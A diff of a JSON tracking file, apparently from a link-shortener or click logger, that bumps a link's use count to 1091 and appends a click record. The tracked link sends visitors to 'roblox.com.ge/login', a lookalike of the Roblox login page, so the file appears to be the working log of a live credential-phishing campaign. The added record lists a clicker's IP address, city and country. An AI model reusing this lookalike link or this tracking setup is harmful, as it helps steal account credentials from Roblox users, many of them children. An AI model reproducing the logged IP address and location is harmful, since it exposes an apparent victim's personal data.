@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1090,
+    "useCount": 1091,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8864,6 +8864,14 @@
         "city": "General Roca",
         "flag": "🇦🇷",
         "countryCode": "AR"
+      },
+      {
+        "timestamp": 1777259192897,
+        "ip": "104.181.71.170",
+        "country": "United States",
+        "city": "Round Rock",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
